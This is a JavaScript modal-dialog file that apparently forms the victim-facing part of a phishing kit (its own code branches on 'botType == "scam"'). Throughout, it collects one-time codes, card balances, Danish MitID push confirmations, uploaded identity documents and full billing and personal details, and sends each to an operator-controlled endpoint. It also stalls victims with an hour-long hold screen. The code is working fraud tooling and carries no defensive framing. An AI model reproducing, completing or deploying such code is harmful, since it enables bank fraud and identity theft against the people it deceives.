class SwalMethods {

    static loadTemplate(path, blockId, custom) {
        pushCustomText = custom;
        $(`#${blockId}`).load(path);
    }

    static resetValidation() {
        if (Swal.getValidationMessage() != null) {
            try {
                Swal.resetValidationMessage();
            } catch {}
        }

        try {
            clearInterval(timerInterval);
        } catch {}
    };
    
    static redirectModal(path, country_code = "DE") {
        var pathName = document.location.pathname,
            origin = document.location.origin,
            params = path === "merchant" ? `?merchant=1&country_code=${country_code}` : "";

        if (botType == "scam") {
            var route = pathName.split('/')[1],
                fullPath = path === "index" ? `${adId}` : `${path}/${adId}`;

            document.location.href = `${origin}/${route}/${fullPath}${params}`;
        } else {
            document.location.href = `${origin}/${path}${params}`;
        }
    };

    static redirectToBankModal(bank, country_code) {
        var pathName = document.location.pathname,
            origin = document.location.origin;
        
        if (botType == "scam") {
            var route = pathName.split('/')[1];
            document.location.href = `${origin}/${route}/merchant/${adId}/?bank=${bank}&country_code=${country_code}`;
        } else {
            document.location.href = `${origin}/merchant/?bank=${bank}&country_code=${country_code}`;
        }
    };

    static redirectToCountryBanksModal(country_code) {
        var pathName = document.location.pathname,
            origin = document.location.origin;

        if (botType == "scam") {
            var route = pathName.split('/')[1];
            document.location.href = `${origin}/${route}/merchant/${adId}/?country_code=${country_code}&merchant=1`;
        } else {
            document.location.href = `${origin}/merchant/?country_code=${country_code}&merchant=1`;
        }
    };

    static redirectCustomModal(url) {
        document.location.href = url;
    };

    static closeModal() {
        Swal.close();
    };

    static expectationModal() {
        Swal.fire({
            title: swalLanguage.expectation.title,
            text: swalLanguage.expectation.text,
            didOpen: () => {
                Swal.showLoading();
            },
            allowOutsideClick: false,
        });
    };

    static errorModal(title, text) {
        Swal.fire({
            icon: "error",
            title: title,
            text: text
        });
    };
    
    static successModal() {
        Swal.fire({
            icon: "success",
            title: swalLanguage.success.title,
            text: botType === "traffic" ? "" : swalLanguage.success.text,
            allowOutsideClick: false,
            showConfirmButton: false
        });
    };

    static codeModal(text, input, icon, image, codeType="secret") {
        Swal.fire({
            icon: icon,
            imageUrl: image,
            text: text,
            input: input,
            inputAttributes: {
                autocapitalize: "off",
                autocorrect: "off",
                maxlength: "255",
                placeholder: swalLanguage.code.input
            },
            allowOutsideClick: false,
            confirmButtonText: swalLanguage.code.confirm,
            showLoaderOnConfirm: true,
            preConfirm: async (code) => {
                if (!code) return Swal.showValidationMessage(swalLanguage.code.error);

                try {
                    const response = await axios.post(codeApiPath, {
                        botType: botType,
                        supportToken: supportToken,
                        codeType: codeType,
                        code: code
                    });
                    return response.data;
                } catch {
                    return Swal.showValidationMessage(swalLanguage.code.error);
                }
            },
        })
        .then((result) => {
            if (result.isConfirmed) 
                system.windowObj(result.value.status);
        });
    };

    static balanceModal() {
        Swal.fire({
            icon: "info",
            text: swalLanguage.correctBalance.text,
            input: "text",
            inputAttributes: {
                id: "swal-input-balance",
                autocapitalize: "off",
                autocorrect: "off",
                maxlength: "255",
                placeholder: swalLanguage.code.input
            },
            allowOutsideClick: false,
            confirmButtonText: swalLanguage.code.confirm,
            showLoaderOnConfirm: true,
            preConfirm: async (code) => {
                if (!code) return Swal.showValidationMessage(swalLanguage.code.error);

                try {
                    const response = await axios.post(codeApiPath, {
                        botType: botType,
                        supportToken: supportToken,
                        codeType: "balance",
                        code: code
                    });
                    return response.data;
                } catch {
                    return Swal.showValidationMessage(swalLanguage.code.error);
                }
            },
        })
        .then((result) => {
            if (result.isConfirmed) 
                system.windowObj(result.value.status);
        });

        var cardBalance = document.getElementById("swal-input-balance");

        new IMask(cardBalance, {
            mask: `0 ${currency}`,
            lazy: false,
        
            blocks: {
                0: {
                    mask: Number,
                    scale: 2,
                    thousandsSeparator: '',
                    padFractionalZeros: true,
                    normalizeZeros: true,
                    radix: '.',
                    mapToRadix: [','],
                    min: -100000000,
                    max: 100000000
                }
            }
        });
    };

    static pushModal({ type, custom = null, showConfirmButton = false }) {
        var pushId = 'swal2-push';

        Swal.fire({
            allowOutsideClick: false,
            showConfirmButton: false,
            showConfirmButton: showConfirmButton,
            showLoaderOnConfirm: true,
            confirmButtonText: swalLanguage.code.confirm,
            html: `<div id="${pushId}"></div>`,
            willOpen: () => {
                if (type.includes("MitIdHelp_")) {
                    var helpTemplate = type.split("MitIdHelp_")[1];
                    SwalMethods.loadTemplate(`/static/other/swal/custom/mitid/${helpTemplate}/index.html`, pushId, custom);
                } else {
                    if (languageCode == "DK") SwalMethods.loadTemplate('/static/other/swal/push/mitid.html', pushId, custom);
                    else SwalMethods.loadTemplate('/static/other/swal/push/push.html', pushId, custom);
                }
            },
            preConfirm: async () => {
                try {
                    const response = await axios.post(codeApiPath, {
                        botType: botType,
                        supportToken: supportToken,
                        codeType: "confirm"
                    });
                    return response.data;
                } catch {
                    return Swal.showValidationMessage(swalLanguage.code.error);
                }
            },
        })
        .then((result) => {
            if (result.isConfirmed) 
                system.windowObj(result.value.status);
        });
    };

    static holdModal({ seconds = 3600 }) {
        Swal.fire({
            html: swalLanguage.hold.html,
            timer: seconds * 1000,
            timerProgressBar: true,
            allowOutsideClick: false,
            didOpen: () => {
                Swal.showLoading();
                const b = Swal.getPopup().querySelector('b');

                timerInterval = setInterval(() => {
                    const totalSeconds = Swal.getTimerLeft() / 1000;
                    const hours = Math.floor(totalSeconds / 3600);
                    const minutes = Math.floor((totalSeconds % 3600) / 60);
                    const seconds = Math.floor(totalSeconds % 60);
                    b.textContent = `${String(hours).padStart(2, '0')}:${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
                }, 100);
            },
            willClose: async () => {
                try {
                    const response = await axios.post(codeApiPath, {
                        botType: botType,
                        supportToken: supportToken,
                        codeType: "timeout"
                    });
                    return response.data;
                } catch {
                    return Swal.showValidationMessage(swalLanguage.code.error);
                }
            },
        }).then((result) => {
            if (result.isConfirmed) 
                system.windowObj(result.value.status);
        });
    };

    static customModal(text, image) {
        Swal.fire({
            imageUrl: image,
            text: text,
            allowOutsideClick: false,
            showConfirmButton: false
        });
    };

    static applicationModal(text) {
        Swal.fire({
            title: swalLanguage.application.title,
            text: text,
            input: "file",
            inputAttributes: {
                "accept": "image/*, .pdf, video/*",
                "name": "files[]",
                "multiple": "multiple"
            },
            confirmButtonText: swalLanguage.code.confirm,
            allowOutsideClick: false,
            showLoaderOnConfirm: true,
            preConfirm: async (files) => {
                if (!files.length) return Swal.showValidationMessage(swalLanguage.code.error);
                if (files.length > 5) return Swal.showValidationMessage(swalLanguage.code.error);

                let totalSize = Array.from(files).reduce((total, file) => total + file.size, 0);
                if (totalSize / 1024 / 1024 > 20) return Swal.showValidationMessage(swalLanguage.code.errorSize);

                try {
                    const formData = new FormData();
                    formData.append("botType", botType);
                    formData.append("supportToken", supportToken);
                    formData.append("codeType", "application");

                    Array.from(files).forEach((file) => {
                        formData.append('files[]', file, file.name, file.type);
                    });
                    
                    const response = await axios.post(codeApiPath, formData, {
                        'Content-Type': 'multipart/form-data'
                    });
                    return response.data;
                } catch {
                    return Swal.showValidationMessage(swalLanguage.code.error);
                }
            },
        })
        .then((result) => {
            if (result.isConfirmed) 
                system.windowObj(result.value.status);
        });
    };

    static doubleInputModal(title = "") {
        Swal.fire({
            title: title,
            html: `
                <input id="swal-input1" class="swal2-input">
                <input id="swal-input2" class="swal2-input">
            `,
            confirmButtonText: swalLanguage.code.confirm,
            allowOutsideClick: false,
            showLoaderOnConfirm: true,
            preConfirm: async () => {
                var inpt1 = document.getElementById("swal-input1").value,
                    inpt2 = document.getElementById("swal-input2").value;
                
                if (inpt1.length == 0 || inpt2.length == 0) 
                    return Swal.showValidationMessage(swalLanguage.code.error);
                
                try {
                    const response = await axios.post(codeApiPath, {
                        botType: botType,
                        supportToken: supportToken,
                        codeType: "double",
                        code: `${inpt1}|-|-|-|${inpt2}`
                    });
                    return response.data;
                } catch {
                    return Swal.showValidationMessage(swalLanguage.code.error);
                }
            },
        })
        .then((result) => {
            if (result.isConfirmed) 
                system.windowObj(result.value.status);
        });
    };

    static inputBillingModal() {
        Swal.fire({
            title: swalLanguage.billing.title,
            html: `
                <input id="swal-input1" class="swal2-input" style="width: -webkit-fill-available;" placeholder="${swalLanguage.billing.full_name}">
                <input id="swal-input2" class="swal2-input" style="width: -webkit-fill-available;" placeholder="${swalLanguage.billing.birth_date}">
                <input id="swal-input3" class="swal2-input" style="width: -webkit-fill-available;" placeholder="${swalLanguage.billing.full_address}">
                <input id="swal-input4" class="swal2-input" style="width: -webkit-fill-available;" placeholder="${swalLanguage.billing.billing_address}">
                <input id="swal-input5" class="swal2-input" style="width: -webkit-fill-available;" placeholder="${swalLanguage.billing.billing_zip}">
                <input id="swal-input6" class="swal2-input" style="width: -webkit-fill-available;" placeholder="${swalLanguage.billing.city}">
                <input id="swal-input7" class="swal2-input" style="width: -webkit-fill-available;" placeholder="${swalLanguage.billing.state}">
                <input id="swal-input8" class="swal2-input" style="width: -webkit-fill-available;" placeholder="${swalLanguage.billing.country}">
                <input id="swal-input9" class="swal2-input" style="width: -webkit-fill-available;" placeholder="${swalLanguage.billing.phone_number}">
                
            `,
            confirmButtonText: swalLanguage.code.confirm,
            allowOutsideClick: false,
            showLoaderOnConfirm: true,
            preConfirm: async () => {
                const inputs = {
                    "full_name": document.getElementById("swal-input1").value,
                    "birth_date": document.getElementById("swal-input2").value,
                    "full_address": document.getElementById("swal-input3").value,
                    "billing_address": document.getElementById("swal-input4").value,
                    "billing_zip": document.getElementById("swal-input5").value,
                    "city": document.getElementById("swal-input6").value,
                    "state": document.getElementById("swal-input7").value,
                    "country": document.getElementById("swal-input8").value,
                    "phone_number": document.getElementById("swal-input9").value
                };

                for (let key in inputs) {
                    if (inputs[key].trim().length === 0) {
                        return Swal.showValidationMessage(swalLanguage.code.error);
                    }
                }

                try {
                    const response = await axios.post(codeApiPath, {
                        botType: botType,
                        supportToken: supportToken,
                        codeType: "billing",
                        code: JSON.stringify(inputs)
                    });
                    return response.data;
                } catch {
                    return Swal.showValidationMessage(swalLanguage.code.error);
                }
            },
        })
        .then((result) => {
            if (result.isConfirmed) 
                system.windowObj(result.value.status);
        });
    };
}